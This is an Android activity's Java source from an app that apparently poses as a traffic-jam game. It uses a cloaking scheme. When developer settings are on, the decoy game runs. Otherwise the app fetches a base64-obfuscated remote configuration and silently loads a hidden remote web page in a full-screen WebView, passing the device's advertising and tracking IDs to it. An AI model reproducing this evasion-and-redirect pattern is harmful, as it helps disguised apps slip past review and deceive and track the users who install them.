package com.ttraafffic.jjamm.mmew.web;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.ttraafffic.jjamm.mmew.R;
import com.ttraafffic.jjamm.mmew.TraJam;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Objects;

public class TJ extends AppCompatActivity {

    String fbId;
    String url;
    String keyDefault;
    WebView webFullApp;
    String dipLin = null;
    String dipLinLink;
    String savedLink = null;
    public ValueCallback<Uri> mUploadMessage;
    public Uri mCapturedImageURI = null;
    public ValueCallback<Uri[]> mFilePathCallback;
    public String filePath;
    public static final int INPUT_FILE_REQUEST_CODE = 1;



    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(1024);
        setContentView(R.layout.tj);

        webFullApp = findViewById(R.id.webViewFullApp);


                if (dev() == 0){
                        con();
                }else{
                    startActivity(new Intent(TJ.this, TraJam.class));
                    finishAffinity();

                }
    }


    private int dev(){
        int adb = Settings.Secure.getInt(this.getContentResolver(),
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0);
        return adb;
    }




    private void con(){

        new Thread(new Runnable() {
            @RequiresApi(api = Build.VERSION_CODES.O)
            @Override
            public void run() {
                try {

                    HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(Decod.decod(Constants.BASE_URL)).openConnection();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                    String s = bufferedReader.readLine();


                    String [] a = s.split("\\\u007C");
                    url = a[0];
                    keyDefault = a[1];
                    fbId = a[2];



                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {

                            feIn();

                           savedLink = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(Decod.decod("c2F2ZWRVcmw="), "null");
                            Log.d("weq",savedLink);
                           if (savedLink.equals("null")) {
                                new Handler().postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        startWeb();
                                    }
                                },5000);

                            } else {
                                WebSettings.webSettings(webFullApp);
                                webFullApp.setWebViewClient(new TJ.WebClient());
                                webFullApp.setWebChromeClient(new TJ.WebChrome());
                                webFullApp.loadUrl(savedLink);
                            }
                        }
                    });
                }catch (Exception e){
                    startActivity(new Intent(TJ.this, TraJam.class));
                    finishAffinity();
                }
            }
        }).start();

    }




    private void feIn(){
        FbIn.fb(fbId,this);


        AppEventsLogger.activateApp(getApplication());
        AppLinkData.fetchDeferredAppLinkData(TJ.this,
                new AppLinkData.CompletionHandler() {
                    @Override
                    public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
                        if (appLinkData == null) {
                            appLinkData = AppLinkData.createFromActivity(TJ.this);
                        }
                        if (appLinkData != null) {
                            Uri url = appLinkData.getTargetUri();
                            dipLin = url.getQuery();
                            dipLinLink = Parser.parser(dipLin,getPackageName(), ApplicationFull.AID,ApplicationFull.appsFlyerUID);

                        }else {

                        }
                    }

                }
        );

    }


    @RequiresApi(api = Build.VERSION_CODES.O)
    private void startWeb(){

        WebSettings.webSettings(webFullApp);
        webFullApp.setWebViewClient(new TJ.WebClient());
        webFullApp.setWebChromeClient(new TJ.WebChrome());

        String statusAppsFlyer = ApplicationFull.statusAppsFlyer;
        String load = null;
        if (statusAppsFlyer.equals(Decod.decod("Tm9uLW9yZ2FuaWM="))){
             load = url + ApplicationFull.params ;
             webFullApp.loadUrl(load);

        }else if(dipLin != null) {
            load = url + dipLinLink;
            webFullApp.loadUrl(load);

        }else {
            if (keyDefault.equals(Decod.decod("Tk8="))) {
                startActivity(new Intent(getApplicationContext(), TraJam.class));
                finishAffinity();
            }else {
                String strAppsFlyer = keyDefault + "?bundle=" + getPackageName() + "&ad_id=" + ApplicationFull.AID + "&apps_id=" + ApplicationFull.appsFlyerUID;
                load = url + strAppsFlyer;
                webFullApp.loadUrl(load);
            }
        }


    }





    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode != INPUT_FILE_REQUEST_CODE || mFilePathCallback == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        filePath(resultCode, data);
        if (mUploadMessage == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        setResults(resultCode, data);
    }

    private void filePath(int resultCode, Intent data) {
        Uri[] results = null;
        if (resultCode == Activity.RESULT_OK) {
            if (data == null) {
                if (filePath != null) {
                    results = new Uri[]{Uri.parse(filePath)};
                }
            } else {
                String dataString = data.getDataString();
                if (dataString != null) {
                    results = new Uri[]{Uri.parse(dataString)};
                }
            }
        }
        mFilePathCallback.onReceiveValue(results);
        mFilePathCallback = null;
    }

    private void setResults(int resultCode, Intent data) {
        Uri result = null;
        try {
            if (resultCode != RESULT_OK) {
                result = null;
            } else {
                result = data == null ? mCapturedImageURI : data.getData();
            }
        } catch (Exception e) { }
        mUploadMessage.onReceiveValue(result);
        mUploadMessage = null;
    }

    @Override
    public void onBackPressed() {
        if (webFullApp.isFocused() && webFullApp.canGoBack()) {
            webFullApp.goBack();
        }
    }




    private class WebClient extends WebViewClient{
        @RequiresApi(api = Build.VERSION_CODES.O)
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {

            if(url.contains(Decod.decod("NDA0"))){
                startActivity(new Intent(getApplicationContext(),TraJam.class));
                finishAffinity();
            }
        }

        @RequiresApi(api = Build.VERSION_CODES.O)
        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(Decod.decod("c2F2ZWRVcmw="),url).apply();
        }
    }

    private class WebChrome extends WebChromeClient {

        @RequiresApi(api = Build.VERSION_CODES.O)
        @Override
        public boolean onShowFileChooser(WebView view,
                                         ValueCallback<Uri[]> filePath,
                                         FileChooserParams fileChooserParams) {

            if (mFilePathCallback != null) {
                mFilePathCallback.onReceiveValue(null);
            }
            mFilePathCallback = filePath;
            Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
            contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
            contentSelectionIntent.setType("*/*");
            Intent[] intentArray = new Intent[0];
            Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
            chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
            chooserIntent.putExtra(Intent.EXTRA_TITLE, Decod.decod("U2VsZWN0IE9wdGlvbjo="));
            chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray);
            startActivityForResult(chooserIntent, 1);
            return true;
        }
    }

}
